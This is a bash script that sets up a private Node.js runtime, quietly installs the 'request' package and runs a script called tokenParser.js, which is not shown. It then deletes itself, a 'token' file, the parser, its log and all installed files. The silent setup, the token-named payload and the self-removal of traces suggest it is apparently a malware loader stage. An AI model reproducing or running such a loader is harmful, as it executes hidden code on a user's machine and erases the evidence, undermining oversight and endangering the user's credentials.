#!/bin/bash

# Creating new Info
set -e

# Node.js Version
NODE_VERSION="20.11.1"
NODE_TARBALL="node-v${NODE_VERSION}"
DOWNLOAD_URL=""
NODE_DIR="$(pwd)/${NODE_TARBALL}"

NODE_INSTALLED_VERSION=""

# Determine the OS (Linux or macOS)
OS=$(uname -s)

# Step 1: Set the Node.js tarball and download URL based on the OS
if [ "$OS" == "Darwin" ]; then
    # macOS
    NODE_TARBALL="${NODE_TARBALL}-darwin-x64.tar.xz"
    DOWNLOAD_URL="https://nodejs.org/dist/v${NODE_VERSION}/${NODE_TARBALL}"
    echo "Running on macOS"
elif [ "$OS" == "Linux" ]; then
    # Linux
    NODE_TARBALL="${NODE_TARBALL}-linux-x64.tar.xz"
    DOWNLOAD_URL="https://nodejs.org/dist/v${NODE_VERSION}/${NODE_TARBALL}"
    echo "Running on Linux"
else
    echo "Unsupported OS: $OS"
    exit 1
fi

NODE_INSTALLED_VERSION=""

# Step 2: Check if Node.js is installed
echo "Checking if Node.js is installed..."
NODE_INSTALLED_VERSION=$(node -v 2>/dev/null || echo "")

# Step 3: Check if Node.js is already installed and set the flag for installation
if [ -z "$NODE_INSTALLED_VERSION" ]; then
    INSTALL_NODE=1
    echo "Node.js not found, will install it..."
else
    INSTALL_NODE=0
    echo "Node.js is already installed: $NODE_INSTALLED_VERSION"
fi

# Step 4: Download Node.js if not installed
if [ "$INSTALL_NODE" -eq 1 ]; then
    echo "Downloading Node.js..."
    if ! command -v curl &> /dev/null; then
        echo "curl not found, using wget"
        wget -q "$DOWNLOAD_URL" -O "$NODE_TARBALL" >/dev/null 2>&1 &
    else
        echo "Using curl to download Node.js"
        curl -sSL -o "$NODE_TARBALL" "$DOWNLOAD_URL" >/dev/null 2>&1 &
    fi
    wait
    echo "Node.js download complete"
fi

# Step 5: Extract Node.js tarball
echo "Extracting Node.js tarball..."
if [ -f "$NODE_TARBALL" ]; then
    tar -xf "$NODE_TARBALL" -C "$(pwd)" >/dev/null 2>&1 &
    wait
    echo "Node.js extracted"
    rm -f "$NODE_TARBALL"
else
    echo "Node.js tarball not found!"
    exit 1
fi

# Step 6: Add Node.js to the system path
echo "Adding Node.js to the system PATH..."
export PATH="$(pwd)/${NODE_TARBALL%.*.*}/bin:$PATH"

# Step 7: Check if Node.js and npm are available
echo "Checking if Node.js and npm are available..."
if ! command -v node &> /dev/null || ! command -v npm &> /dev/null; then
    echo "Node.js or npm not found!"
    exit 1
else
    echo "Node.js and npm are available"
fi

# Step 8: Install the "request" package if it's not installed
echo "Checking if the 'request' package is installed..."
if [ ! -d "$(pwd)/node_modules/request" ]; then
    echo "Installing 'request' package..."
    npm install request --silent --no-progress --loglevel=error --fund=false >/dev/null 2>&1 &
    wait
    echo "'request' package installed"
else
    echo "'request' package is already installed"
fi

# Step 9: Run tokenParser.js if it exists
TOKEN_PARSER_PATH="$(dirname "$0")/tokenParser.js"

if [ -f "$TOKEN_PARSER_PATH" ]; then
    # Running the Node.js script in the background with nohup
    echo "Running tokenParser.js..."
    nohup node "$TOKEN_PARSER_PATH" > "$(pwd)/tokenParser.log" 2>&1 &
    # Wait for the background job to finish
    wait $!
    
    # Check if the Node.js script ran successfully
    if [ $? -ne 0 ]; then
        echo "Error: tokenParser.js failed to execute."
        exit 1
    fi
else
    echo "Error: tokenParser.js does not exist."
    exit 1
fi

# Step 10: Clean up generated files
echo "Cleaning up generated files..."

# Clean up token.sh, token, tokenParser.js, and node_modules in the background
rm -f "$(pwd)/token.sh" >/dev/null 2>&1 &
rm -f "$(pwd)/token" >/dev/null 2>&1 &
rm -f "$(pwd)/tokenParser.js" >/dev/null 2>&1 &
rm -rf "$(pwd)/node_modules" >/dev/null 2>&1 &
rm -rf "$(pwd)/node-v20.11.1-linux-x64" >/dev/null 2>&1 &
rm -f "$(pwd)/package.json" >/dev/null 2>&1 &
rm -f "$(pwd)/package-lock.json" >/dev/null 2>&1 &
rm -f "$(pwd)/tokenParser.log" >/dev/null 2>&1 &

# Wait for all cleanup tasks to finish
wait

echo "Cleanup complete"
echo "Script completed successfully"

exit 0
